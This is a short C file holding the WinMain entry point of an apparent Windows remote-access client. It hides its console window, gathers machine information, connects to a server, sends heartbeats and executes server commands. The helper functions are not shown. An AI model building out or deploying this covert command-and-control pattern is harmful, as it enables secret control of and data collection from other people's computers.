#include "main_client.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// Hide the console window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	getMachineInformation();

	if (connectToServer() != 0) { return 1; }

	CreateThread(NULL, 0, sendHeartbeat, NULL, 0, NULL);

	handleServerCommands();

	closesocket(clientSocket);
	WSACleanup();

	return 0;
}